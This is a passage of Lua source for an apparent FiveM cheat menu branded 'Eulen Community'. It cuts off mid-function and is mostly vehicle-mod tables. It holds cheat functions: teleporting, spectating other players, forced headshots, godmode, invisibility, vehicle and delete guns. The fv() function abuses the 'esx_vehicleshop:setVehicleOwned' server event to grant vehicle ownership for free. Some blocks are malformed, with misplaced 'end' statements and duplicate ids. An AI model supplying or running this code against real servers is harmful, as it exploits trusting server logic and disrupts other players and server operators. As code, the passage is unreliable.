        name = '~h~Arch Cover',
        id = 42
    },
    {
        name = '~h~Aerials',
        id = 43
    },
    {
        name = '~h~Trim 2',
        id = 44
    },
    {
        name = '~h~Tank',
        id = 45
    },
    {
        name = '~h~Windows',
        id = 46
    },
    {
        name = '~h~Livery',
        id = 48
    },
    {
        name = '~h~Horns',
        id = 14
    },
    {
        name = '~h~Wheels',
        id = 23
    },
    {
        name = '~h~Wheel Types',
        id = 'wheeltypes'
    },
    {
        name = '~h~Extras',
        id = 'extra'
    },
    {
        name = '~h~Neons',
        id = 'neon'
    },
    {
        name = '~h~Paint',
        id = 'paint'
    },
    {
        name = '~h~Headlights Color',
        id = 'headlight'
    },
    {
        name = '~h~Licence Plate',
        id = 'licence'
    }
}
local bm = {
    {
        name = '~h~~p~Engine',
        id = 11
    },
    {
        name = '~h~~b~Brakes',
        id = 12
    },
    {
        name = '~h~~g~Transmission',
        id = 13
    },
    {
        name = '~h~~y~Suspension',
        id = 15
    },
    {
        name = '~h~~b~Armor',
        id = 16
    }
}
local bn = {
    {
        name = '~h~Blue on White 2',
        id = 0
    },
    {
        name = '~h~Blue on White 3',
        id = 4
    },
    {
        name = '~h~Yellow on Blue',
        id = 2
    },
    {
        name = '~h~Yellow on Black',
        id = 1
    },
    {
        name = '~h~North Yankton',
        id = 5
    }
}
local bo = {
    {
        name = '~h~Default',
        id = -1
    },
    {
        name = '~h~White',
        id = 0
    },
    {
        name = '~h~Blue',
        id = 1
    },
    {
        name = '~h~Electric Blue',
        id = 2
    },
    {
        name = '~h~Mint Green',
        id = 3
    },
    {
        name = '~h~Lime Green',
        id = 4
    },
    {
        name = '~h~Yellow',
        id = 5
    },
    {
        name = '~h~Golden Shower',
        id = 6
    },
    {
        name = '~h~Orange',
        id = 7
    },
    {
        name = '~h~Red',
        id = 8
    },
    {
        name = '~h~Pony Pink',
        id = 9
    },
    {
        name = '~h~Hot Pink',
        id = 10
    },
    {
        name = '~h~Purple',
        id = 11
    },
    {
        name = '~h~Blacklight',
        id = 12
    }
}
local bp = {
    ['Stock Horn'] = -1,
    ['Truck Horn'] = 1,
    ['Police Horn'] = 2,
    ['Clown Horn'] = 3,
    ['Musical Horn 1'] = 4,
    ['Musical Horn 2'] = 5,
    ['Musical Horn 3'] = 6,
    ['Musical Horn 4'] = 7,
    ['Musical Horn 5'] = 8,
    ['Sad Trombone Horn'] = 9,
    ['Classical Horn 1'] = 10,
    ['Classical Horn 2'] = 11,
    ['Classical Horn 3'] = 12,
    ['Classical Horn 4'] = 13,
    ['Classical Horn 5'] = 14,
    ['Classical Horn 6'] = 15,
    ['Classical Horn 7'] = 16,
    ['Scaledo Horn'] = 17,
    ['Scalere Horn'] = 18,
    ['Salemi Horn'] = 19,
    ['Scalefa Horn'] = 20,
    ['Scalesol Horn'] = 21,
    ['Scalela Horn'] = 22,
    ['Scaleti Horn'] = 23,
    ['Scaledo Horn High'] = 24,
    ['Jazz Horn 1'] = 25,
    ['Jazz Horn 2'] = 26,
    ['Jazz Horn 3'] = 27,
    ['Jazz Loop Horn'] = 28,
    ['Starspangban Horn 1'] = 28,
    ['Starspangban Horn 2'] = 29,
    ['Starspangban Horn 3'] = 30,
    ['Starspangban Horn 4'] = 31,
    ['Classical Loop 1'] = 32,
    ['Classical Horn 8'] = 33,
    ['Classical Loop 2'] = 34
}
local bq = {
    ['White'] = {
        255,
        255,
        255
    },
    ['Blue'] = {
        0,
        0,
        255
    },
    ['Electric Blue'] = {
        0,
        150,
        255
    },
    ['Mint Green'] = {
        50,
        255,
        155
    },
    ['Lime Green'] = {
        0,
        255,
        0
    },
    ['Yellow'] = {
        255,
        255,
        0
    },
    ['Golden Shower'] = {
        204,
        204,
        0
    },
    ['Orange'] = {
        255,
        128,
        0
    },
    ['Red'] = {
        255,
        0,
        0
    },
    ['Pony Pink'] = {
        255,
        102,
        255
    },
    ['Hot Pink'] = {
        255,
        0,
        255
    },
    ['Purple'] = {
        153,
        0,
        153
    }
}
local br = {
    {
        name = '~h~Black',
        id = 0
    },
    {
        name = '~h~Carbon Black',
        id = 147
    },
    {
        name = '~h~Graphite',
        id = 1
    },
    {
        name = '~h~Anhracite Black',
        id = 11
    },
    {
        name = '~h~Black Steel',
        id = 2
    },
    {
        name = '~h~Dark Steel',
        id = 3
    },
    {
        name = '~h~Silver',
        id = 4
    },
    {
        name = '~h~Bluish Silver',
        id = 5
    },
    {
        name = '~h~Rolled Steel',
        id = 6
    },
    {
        name = '~h~Shadow Silver',
        id = 7
    },
    {
        name = '~h~Stone Silver',
        id = 8
    },
    {
        name = '~h~Midnight Silver',
        id = 9
    },
    {
        name = '~h~Cast Iron Silver',
        id = 10
    },
    {
        name = '~h~Red',
        id = 27
    },
    {
        name = '~h~Torino Red',
        id = 28
    },
    {
        name = '~h~Formula Red',
        id = 29
    },
    {
        name = '~h~Lava Red',
        id = 150
    },
    {
        name = '~h~Blaze Red',
        id = 30
    },
    {
        name = '~h~Grace Red',
        id = 31
    },
    {
        name = '~h~Garnet Red',
        id = 32
    },
    {
        name = '~h~Sunset Red',
        id = 33
    },
    {
        name = '~h~Cabernet Red',
        id = 34
    },
    {
        name = '~h~Wine Red',
        id = 143
    },
    {
        name = '~h~Candy Red',
        id = 35
    },
    {
        name = '~h~Hot Pink',
        id = 135
    },
    {
        name = '~h~Pfsiter Pink',
        id = 137
    },
    {
        name = '~h~Salmon Pink',
        id = 136
    },
    {
        name = '~h~Sunrise Orange',
        id = 36
    },
    {
        name = '~h~Orange',
        id = 38
    },
    {
        name = '~h~Bright Orange',
        id = 138
    },
    {
        name = '~h~Gold',
        id = 99
    },
    {
        name = '~h~Bronze',
        id = 90
    },
    {
        name = '~h~Yellow',
        id = 88
    },
    {
        name = '~h~Race Yellow',
        id = 89
    },
    {
        name = '~h~Dew Yellow',
        id = 91
    },
    {
        name = '~h~Dark Green',
        id = 49
    },
    {
        name = '~h~Racing Green',
        id = 50
    },
    {
        name = '~h~Sea Green',
        id = 51
    },
    {
        name = '~h~Olive Green',
        id = 52
    },
    {
        name = '~h~Bright Green',
        id = 53
    },
    {
        name = '~h~Gasoline Green',
        id = 54
    },
    {
        name = '~h~Lime Green',
        id = 92
    },
    {
        name = '~h~Midnight Blue',
        id = 141
    },
    {
        name = '~h~Galaxy Blue',
        id = 61
    },
    {
        name = '~h~Dark Blue',
        id = 62
    },
    {
        name = '~h~Saxon Blue',
        id = 63
    },
    {
        name = '~h~Blue',
        id = 64
    },
    {
        name = '~h~Mariner Blue',
        id = 65
    },
    {
        name = '~h~Harbor Blue',
        id = 66
    },
    {
        name = '~h~Diamond Blue',
        id = 67
    },
    {
        name = '~h~Surf Blue',
        id = 68
    },
    {
        name = '~h~Nautical Blue',
        id = 69
    },
    {
        name = '~h~Racing Blue',
        id = 73
    },
    {
        name = '~h~Ultra Blue',
        id = 70
    },
    {
        name = '~h~Light Blue',
        id = 74
    },
    {
        name = '~h~Chocolate Brown',
        id = 96
    },
    {
        name = '~h~Bison Brown',
        id = 101
    },
    {
        name = '~h~Creeen Brown',
        id = 95
    },
    {
        name = '~h~Feltzer Brown',
        id = 94
    },
    {
        name = '~h~Maple Brown',
        id = 97
    },
    {
        name = '~h~Beechwood Brown',
        id = 103
    },
    {
        name = '~h~Sienna Brown',
        id = 104
    },
    {
        name = '~h~Saddle Brown',
        id = 98
    },
    {
        name = '~h~Moss Brown',
        id = 100
    },
    {
        name = '~h~Woodbeech Brown',
        id = 102
    },
    {
        name = '~h~Straw Brown',
        id = 99
    },
    {
        name = '~h~Sandy Brown',
        id = 105
    },
    {
        name = '~h~Bleached Brown',
        id = 106
    },
    {
        name = '~h~Schafter Purple',
        id = 71
    },
    {
        name = '~h~Spinnaker Purple',
        id = 72
    },
    {
        name = '~h~Midnight Purple',
        id = 142
    },
    {
        name = '~h~Bright Purple',
        id = 145
    },
    {
        name = '~h~Cream',
        id = 107
    },
    {
        name = '~h~Ice White',
        id = 111
    },
    {
        name = '~h~Frost White',
        id = 112
    }
}
local bs = '~u~Eulen ~s~Community'
local bt = {
    {
        name = '~h~Black',
        id = 12
    },
    {
        name = '~h~Gray',
        id = 13
    },
    {
        name = '~h~Light Gray',
        id = 14
    },
    {
        name = '~h~Ice White',
        id = 131
    },
    {
        name = '~h~Blue',
        id = 83
    },
    {
        name = '~h~Dark Blue',
        id = 82
    },
    {
        name = '~h~Midnight Blue',
        id = 84
    },
    {
        name = '~h~Midnight Purple',
        id = 149
    },
    {
        name = '~h~Schafter Purple',
        id = 148
    },
    {
        name = '~h~Red',
        id = 39
    },
    {
        name = '~h~Dark Red',
        id = 40
    },
    {
        name = '~h~Orange',
        id = 41
    },
    {
        name = '~h~Yellow',
        id = 42
    },
    {
        name = '~h~Lime Green',
        id = 55
    },
    {
        name = '~h~Green',
        id = 128
    },
    {
        name = '~h~Forest Green',
        id = 151
    },
    {
        name = '~h~Foliage Green',
        id = 155
    },
    {
        name = '~h~Olive Darb',
        id = 152
    },
    {
        name = '~h~Dark Earth',
        id = 153
    },
    {
        name = '~h~Desert Tan',
        id = 154
    }
}
local bu = {
    {
        name = '~h~Brushed Steel',
        id = 117
    },
    {
        name = '~h~Brushed Black Steel',
        id = 118
    },
    {
        name = '~h~Brushed Aluminum',
        id = 119
    },
    {
        name = '~h~Pure Gold',
        id = 158
    },
    {
        name = '~h~Brushed Gold',
        id = 159
    }
}
local bv = false
local bw = true
local dB = 1
local dC = 1
local dD = {
    1.0,
	2.0,
	4.0,
	10.0,
	512.0,
	9999.0
}
local Enabled = true

local function TeleportToWaypoint()
	if DoesBlipExist(GetFirstBlipInfoId(8)) then
		local blipIterator = GetBlipInfoIdIterator(8)
		local blip = GetFirstBlipInfoId(8, blipIterator)
		WaypointCoords = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector()) --Thanks To Briglair [forum.FiveM.net]
		wp = true
	else
		drawNotification("~p~No waypoint!")
	end

	local zHeigt = 0.0
	height = 1000.0
	while true do
		Citizen.Wait(0)
		if wp then
			if
				IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
					(GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1))
			 then
				entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
			else
				entity = GetPlayerPed(-1)
			end

			SetEntityCoords(entity, WaypointCoords.x, WaypointCoords.y, height)
			FreezeEntityPosition(entity, true)
			local Pos = GetEntityCoords(entity, true)

			if zHeigt == 0.0 then
				height = height - 25.0
				SetEntityCoords(entity, Pos.x, Pos.y, height)
				bool, zHeigt = GetGroundZFor_3dCoord(Pos.x, Pos.y, Pos.z, 0)
			else
				SetEntityCoords(entity, Pos.x, Pos.y, zHeigt)
				FreezeEntityPosition(entity, false)
				wp = false
				height = 1000.0
				zHeigt = 0.0
				drawNotification("~g~Teleported to waypoint!")
				break
			end
		end
	end
end

function stringsplit(inputstr, sep)
	if sep == nil then
		sep = "%s"
	end
	local t = {}
	i = 1
	for str in string.gmatch(inputstr, "([^" .. sep .. "]+)") do
		t[i] = str
		i = i + 1
	end
	return t
end

local Spectating = false

function SpectatePlayer(player)
	local playerPed = PlayerPedId()
	Spectating = not Spectating
	local targetPed = GetPlayerPed(player)

	if (Spectating) then
		local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, false))

		RequestCollisionAtCoord(targetx, targety, targetz)
		NetworkSetInSpectatorMode(true, targetPed)

		drawNotification("Spectating " .. GetPlayerName(player))
	else
		local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, false))

		RequestCollisionAtCoord(targetx, targety, targetz)
		NetworkSetInSpectatorMode(false, targetPed)

		drawNotification("Stopped Spectating " .. GetPlayerName(player))
	end
end

function ShootPlayer(player)
	local head = GetPedBoneCoords(player, GetEntityBoneIndexByName(player, "SKEL_HEAD"), 0.0, 0.0, 0.0)
	SetPedShootsAtCoord(PlayerPedId(), head.x, head.y, head.z, true)
end

function MaxOut(veh)
                    SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
                    SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, 16, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 24, 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1, true)
                    SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1)
                    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
                    SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5)
end
function engine(veh)
					 SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)
					


					
end

function DelVeh(veh)
	SetEntityAsMissionEntity(Object, 1, 1)
	DeleteEntity(Object)
	SetEntityAsMissionEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, 1)
	DeleteEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false))
end

function Clean(veh)
	SetVehicleDirtLevel(veh, 15.0)
end

function Clean2(veh)
	SetVehicleDirtLevel(veh, 1.0)
end


entityEnumerator = {
	__gc = function(enum)
	  if enum.destructor and enum.handle then
		enum.destructor(enum.handle)
	  end
	  enum.destructor = nil
	  enum.handle = nil
	end
  }

function EnumerateEntities(initFunc, moveFunc, disposeFunc)
	return coroutine.wrap(function()
	  local iter, id = initFunc()
	  if not id or id == 0 then
		disposeFunc(iter)
		return
	  end
	  
	  local enum = {handle = iter, destructor = disposeFunc}
	  setmetatable(enum, entityEnumerator)
	  
	  local next = true
	  repeat
		coroutine.yield(id)
		next, id = moveFunc(iter)
	  until not next
	  
	  enum.destructor, enum.handle = nil, nil
	  disposeFunc(iter)
	end)
  end

  function EnumerateObjects()
	return EnumerateEntities(FindFirstObject, FindNextObject, EndFindObject)
  end

  function EnumeratePeds()
	return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
  end

  function EnumerateVehicles()
	return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
  end

  function EnumeratePickups()
	return EnumerateEntities(FindFirstPickup, FindNextPickup, EndFindPickup)
  end

function RequestControl(entity)
	local Waiting = 0
	NetworkRequestControlOfEntity(entity)
	while not NetworkHasControlOfEntity(entity) do
		Waiting = Waiting + 100
		Citizen.Wait(100)
		if Waiting > 5000 then
			drawNotification("Hung for 5 seconds, killing to prevent issues...")
		end
	end
end

function getEntity(player)
	local result, entity = GetEntityPlayerIsFreeAimingAt(player, Citizen.ReturnResultAnyway())
	return entity
end

function GetInputMode()
	return Citizen.InvokeNative(0xA571D46727E2B718, 2) and "MouseAndKeyboard" or "GamePad"
end

function DrawSpecialText(m_text, showtime)
	SetTextEntry_2("STRING")
	AddTextComponentString(m_text)
	DrawSubtitleTimed(showtime, 1)
end


local function fv()
    local cb = KeyboardInput('Enter Vehicle Spawn Name', '', 100)
    local cw = KeyboardInput('Enter Vehicle Licence Plate', '', 100)
    if cb and IsModelValid(cb) and IsModelAVehicle(cb) then
        RequestModel(cb)
        while not HasModelLoaded(cb) do
            Citizen.Wait(0)
        end
        local veh =
            CreateVehicle(
            GetHashKey(cb),
            GetEntityCoords(PlayerPedId(-1)),
            GetEntityHeading(PlayerPedId(-1)),
            true,
            true
        )
        SetVehicleNumberPlateText(veh, cw)
        local cx = ESX.Game.GetVehicleProperties(veh)
        TriggerServerEvent('esx_vehicleshop:setVehicleOwned', cx)
        av('~g~~h~Success', false)
    else
        av('~b~~h~Model is not valid!', true)
    end
end

ShowHudComponentThisFrame(14)

Citizen.CreateThread(function() 
	local headId = {}
	while true do
		Citizen.Wait(1)
		if playerBlips then
		
			for id = 0, 128 do
				if NetworkIsPlayerActive(id) and GetPlayerPed(id) ~= GetPlayerPed(-1) then
					ped = GetPlayerPed(id)
					blip = GetBlipFromEntity(ped)

				
					
					headId[id] = CreateMpGamerTag(ped, GetPlayerName( id ), false, false, "", false)
					wantedLvl = GetPlayerWantedLevel(id)

					
					if wantedLvl then
						SetMpGamerTagVisibility(headId[id], 7, true)
						SetMpGamerTagWantedLevel(headId[id], wantedLvl)
					else
						SetMpGamerTagVisibility(headId[id], 7, false)
					end

				
					if NetworkIsPlayerTalking(id) then
						SetMpGamerTagVisibility(headId[id], 9, true) 
					else
						SetMpGamerTagVisibility(headId[id], 9, false)
					end

					

					if not DoesBlipExist(blip) then 
						blip = AddBlipForEntity(ped)
						SetBlipSprite(blip, 1)
						ShowHeadingIndicatorOnBlip(blip, true)
					else
						veh = GetVehiclePedIsIn(ped, false)
						blipSprite = GetBlipSprite(blip)
						if not GetEntityHealth(ped) then
							if blipSprite ~= 274 then
								SetBlipSprite(blip, 274)
								ShowHeadingIndicatorOnBlip(blip, false)
							end
						elseif veh then
							vehClass = GetVehicleClass(veh)
							vehModel = GetEntityModel(veh)
							if vehClass == 15 then
								if blipSprite ~= 422 then
									SetBlipSprite(blip, 422)
									ShowHeadingIndicatorOnBlip(blip, false) 
								end
							elseif vehClass == 8 then
								if blipSprite ~= 226 then
									SetBlipSprite(blip, 226)
									ShowHeadingIndicatorOnBlip(blip, false) 
								end
							elseif vehClass == 16 then
								if vehModel == GetHashKey("besra") or vehModel == GetHashKey("hydra") or vehModel == GetHashKey("lazer") then
									if blipSprite ~= 424 then
										SetBlipSprite(blip, 424)
										ShowHeadingIndicatorOnBlip(blip, false) 
									end
								elseif blipSprite ~= 423 then
									SetBlipSprite(blip, 423)
									ShowHeadingIndicatorOnBlip(blip, false)
								end
							elseif vehClass == 14 then
								if blipSprite ~= 427 then
									SetBlipSprite(blip, 427)
									ShowHeadingIndicatorOnBlip(blip, false)
								end
							elseif vehModel == GetHashKey("insurgent") or vehModel == GetHashKey("insurgent2") or vehModel == GetHashKey("insurgent3") then 
								if blipSprite ~= 426 then
									SetBlipSprite(blip, 426)
									ShowHeadingIndicatorOnBlip(blip, false)
								end
							elseif vehModel == GetHashKey("limo2") then
								if blipSprite ~= 460 then
									SetBlipSprite(blip, 460)
									ShowHeadingIndicatorOnBlip(blip, false)
								end
							elseif vehModel == GetHashKey("rhino") then
								if blipSprite ~= 421 then
									SetBlipSprite(blip, 421)
									ShowHeadingIndicatorOnBlip(blip, false) 
								end
							elseif vehModel == GetHashKey("trash") or vehModel == GetHashKey("trash2") then
								if blipSprite ~= 318 then
									SetBlipSprite(blip, 318)
									ShowHeadingIndicatorOnBlip(blip, false)
								end
							elseif vehModel == GetHashKey("pbus") then 
								if blipSprite ~= 513 then
									SetBlipSprite(blip, 513)
									ShowHeadingIndicatorOnBlip(blip, false) 
								end
							elseif vehModel == GetHashKey("seashark") or vehModel == GetHashKey("seashark2") or vehModel == GetHashKey("seashark3") then
								if blipSprite ~= 471 then
									SetBlipSprite(blip, 471)
									ShowHeadingIndicatorOnBlip(blip, false) 
								end
							elseif vehModel == GetHashKey("cargobob") or vehModel == GetHashKey("cargobob2") or vehModel == GetHashKey("cargobob3") or vehModel == GetHashKey("cargobob4") then -- Cargobobs
								if blipSprite ~= 481 then
									SetBlipSprite(blip, 481)
									ShowHeadingIndicatorOnBlip(blip, false) 
								end
							elseif vehModel == GetHashKey("technical") or vehModel == GetHashKey("technical2") or vehModel == GetHashKey("technical3") then -- Technical
								if blipSprite ~= 426 then
									SetBlipSprite(blip, 426)
									ShowHeadingIndicatorOnBlip(blip, false) 
								end
							elseif vehModel == GetHashKey("taxi") then 
								if blipSprite ~= 198 then
									SetBlipSprite(blip, 198)
									ShowHeadingIndicatorOnBlip(blip, false) 
								end
							elseif vehModel == GetHashKey("fbi") or vehModel == GetHashKey("fbi2") or vehModel == GetHashKey("police2") or vehModel == GetHashKey("police3") -- Police Vehicles
								or vehModel == GetHashKey("police") or vehModel == GetHashKey("sheriff2") or vehModel == GetHashKey("sheriff")
								or vehModel == GetHashKey("policeold2") or vehModel == GetHashKey("policeold1") then
								if blipSprite ~= 56 then
									SetBlipSprite(blip, 56)
									ShowHeadingIndicatorOnBlip(blip, false) 
								end
							elseif blipSprite ~= 1 then 
								SetBlipSprite(blip, 1)
								ShowHeadingIndicatorOnBlip(blip, true)
							end

							
							passengers = GetVehicleNumberOfPassengers(veh)

							if passengers then
								if not IsVehicleSeatFree(veh, -1) then
									passengers = passengers + 1
								end
								ShowNumberOnBlip(blip, passengers)
							else
								HideNumberOnBlip(blip)
							end
						else
							
							HideNumberOnBlip(blip)
							if blipSprite ~= 1 then
								SetBlipSprite(blip, 1)
								ShowHeadingIndicatorOnBlip(blip, true)
							end
						end
						
						SetBlipRotation(blip, math.ceil(GetEntityHeading(veh))) 
						SetBlipNameToPlayerName(blip, id)
						SetBlipScale(blip,  0.85) 

						
						if IsPauseMenuActive() then
							SetBlipAlpha( blip, 255 )
						else
							x1, y1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
							x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(id), true))
							distance = (math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1)) + 900
							

							if distance < 0 then
								distance = 0
							elseif distance > 255 then
								distance = 255
							end
							SetBlipAlpha(blip, distance)
						end
					end
				end
			end
		else
			for id = 0, 128 do
				ped = GetPlayerPed(id)
				blip = GetBlipFromEntity(ped)
				if DoesBlipExist(blip) then
					RemoveBlip(blip)
				end
				if IsMpGamerTagActive(headId[id]) then
					RemoveMpGamerTag(headId[id])
				end
			end
		end
	end
end)

Citizen.CreateThread(
	function()
		while Enabled do
			Citizen.Wait(0)
			SetPlayerInvincible(PlayerId(), Godmode)
			SetEntityInvincible(PlayerPedId(), Godmode)
			if SuperJump then
				SetSuperJumpThisFrame(PlayerId())
			end
			
			if ePunch then
				SetExplosiveMeleeThisFrame(PlayerId())
			end

			if InfStamina then
				RestorePlayerStamina(PlayerId(), 1.0)
			end

			if Invisible then
				SetEntityVisible(GetPlayerPed(-1), false, 0)
			else
				SetEntityVisible(GetPlayerPed(-1), true, 0)
				
			if fastrun then
				SetRunSprintMultiplierForPlayer(PlayerId(), 2.49)
				SetPedMoveRateOverride(GetPlayerPed(-1), 2.15)
			else
				SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
				SetPedMoveRateOverride(GetPlayerPed(-1), 1.0)
	end
end


			if VehicleGun then
				local VehicleGunVehicle = "Freight"
				local playerPedPos = GetEntityCoords(GetPlayerPed(-1), true)
				if (IsPedInAnyVehicle(GetPlayerPed(-1), true) == false) then
					drawNotification("~g~Vehicle Gun Enabled!~n~~w~Use The ~b~AP Pistol~n~~b~Aim ~w~and ~b~Shoot!")
					GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_APPISTOL"), 999999, false, true)
					SetPedAmmo(GetPlayerPed(-1), GetHashKey("WEAPON_APPISTOL"), 999999)
					if (GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey("WEAPON_APPISTOL")) then
						if IsPedShooting(GetPlayerPed(-1)) then
							while not HasModelLoaded(GetHashKey(VehicleGunVehicle)) do
								Citizen.Wait(0)
								RequestModel(GetHashKey(VehicleGunVehicle))
							end
							local veh = CreateVehicle(GetHashKey(VehicleGunVehicle), playerPedPos.x + (5 * GetEntityForwardX(GetPlayerPed(-1))), playerPedPos.y + (5 * GetEntityForwardY(GetPlayerPed(-1))), playerPedPos.z + 2.0, GetEntityHeading(GetPlayerPed(-1)), true, true)
							SetEntityAsNoLongerNeeded(veh)
							SetVehicleForwardSpeed(veh, 150.0)
						end
					end
				end
			end

			if DeleteGun then
				local gotEntity = getEntity(PlayerId())
				if (IsPedInAnyVehicle(GetPlayerPed(-1), true) == false) then
					drawNotification("~g~Delete Gun Enabled!~n~~w~Use The ~b~Pistol~n~~b~Aim ~w~and ~b~Shoot ~w~To Delete!")
					GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999, false, true)
					SetPedAmmo(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999)
					if (GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey("WEAPON_PISTOL")) then
						if IsPlayerFreeAiming(PlayerId()) then
							if IsEntityAPed(gotEntity) then
								if IsPedInAnyVehicle(gotEntity, true) then
									if IsControlJustReleased(1, 142) then
